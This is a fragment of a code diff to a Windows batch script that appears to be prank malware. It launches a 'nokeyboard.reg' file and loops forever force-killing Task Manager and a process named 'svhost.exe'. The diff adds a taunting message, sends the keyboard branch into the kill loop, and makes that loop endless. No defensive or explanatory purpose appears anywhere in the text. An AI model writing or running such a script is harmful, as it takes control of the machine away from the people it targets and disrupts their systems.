@@ -40,11 +40,13 @@ goto lol
 
 :nokey
 start "nokeyboard.reg"
-goto nokey
+goto lol
 
 
 :lol
+msg * You shouldn't have done that
 taskkill /f /im taskmgr.exe
 ping localhost -n 3 >nul
 taskkill /f /im svhost.exe
 ping localhost -n 3 >nul
+goto lol
